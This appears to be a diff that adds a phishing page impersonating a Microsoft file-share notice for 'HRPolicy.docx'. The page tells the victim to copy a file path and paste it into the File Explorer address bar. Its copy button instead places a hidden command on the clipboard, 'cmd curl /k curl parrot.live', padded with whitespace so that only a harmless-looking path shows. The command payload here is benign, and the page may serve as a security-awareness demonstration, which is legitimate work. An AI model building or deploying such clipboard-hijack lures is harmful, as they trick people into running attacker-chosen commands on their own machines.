@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>HR Policy Access</title>
+  <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600&display=swap" rel="stylesheet">
+  <style>
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #f3f2f1;
+      margin: 0;
+      padding: 40px;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+    }
+
+    .card {
+      width: 420px;
+      background-color: white;
+      border: 1px solid #ccc;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+      border-radius: 4px;
+      padding: 32px;
+      position: relative;
+    }
+
+    .logo {
+      width: 110px;
+      margin-bottom: 24px;
+    }
+
+    .icon {
+      font-size: 36px;
+      margin-bottom: 16px;
+      color: #0078d4;
+    }
+
+    .heading {
+      font-size: 18px;
+      font-weight: 600;
+      color: #2b2b2b;
+      margin-bottom: 6px;
+    }
+
+    .timestamp {
+      font-size: 12px;
+      color: #666;
+      margin-bottom: 20px;
+    }
+
+    .instructions {
+      font-size: 14px;
+      color: #2b2b2b;
+      line-height: 1.6;
+    }
+
+    .instructions ol {
+      padding-left: 20px;
+    }
+
+    .file-path-button {
+      margin: 20px 0;
+      background-color: #f3f2f1;
+      padding: 10px 12px;
+      border-radius: 3px;
+      font-family: monospace;
+      color: #333;
+      position: relative;
+      cursor: pointer;
+      transition: background-color 0.2s;
+      text-align: left;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .file-path-button:hover {
+      background-color: #e1dfdd;
+    }
+
+    .file-path-text {
+      flex: 1;
+      opacity: 1;
+      transition: opacity 0.2s;
+    }
+
+    .file-path-button:hover .file-path-text {
+      opacity: 0.6;
+    }
+
+    .copy-icon {
+      display: none;
+      color: #0078d4;
+      font-size: 14px;
+      margin-left: 12px;
+      flex-shrink: 0;
+    }
+
+    .file-path-button:hover .copy-icon {
+      display: inline;
+    }
+
+    .open-btn {
+      margin-top: 24px;
+      width: 100%;
+      background-color: #0078d4;
+      color: white;
+      border: none;
+      padding: 12px;
+      font-size: 14px;
+      font-weight: 600;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+
+    .open-btn:hover {
+      background-color: #005ea6;
+    }
+
+    #fileInput {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="card">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo" class="logo">
+
+    <div class="heading">Ben Askew made "HRPolicy.docx" available to you</div>
+    <div class="timestamp">07/07/2025 10:22 AM</div>
+
+    <div class="instructions">
+      <p>To access <strong>HRPolicy.docx</strong>, follow these steps:</p>
+      <ol>
+        <li>Copy the file path below</li>
+        <li>Press Open File Explorer and select the address bar (<strong>CTRL + L</strong>)</li>
+        <li>Paste the file path and press <strong>Enter</strong></li>
+      </ol>
+    </div>
+
+    <div class="file-path-button" onclick="copyFilePath()">
+    <span class="file-path-text">C:\Company\Internal-Secure\filedrive\HRPolicy.docx</span>
+    <span id="filePath" style="display:none;">cmd curl /k curl parrot.live                                                                                 C:\company\internal-secure\filedrive\HRPolicy.docx</span>
+
+      <span class="copy-icon">📋</span>
+    </div>
+
+    <button class="open-btn" onclick="triggerFileDialog()">Open File Explorer</button>
+    <input type="file" id="fileInput" onchange="handleFileSelect()" />
+  </div>
+
+  <script>
+    function copyFilePath() {
+      const copyText = document.getElementById("filePath").innerText;
+      navigator.clipboard.writeText(copyText).then(() => {
+        alert("File path copied to clipboard.");
+      });
+    }
+
+    function triggerFileDialog() {
+      document.getElementById('fileInput').click();
+    }
+
+    function handleFileSelect() {
+      const input = document.getElementById('fileInput');
+      if (input.files.length > 0) {
+        const fileName = input.files[0].name;
+        alert("You selected: " + fileName);
+      }
+    }
+  </script>
+
+</body>
+</html>
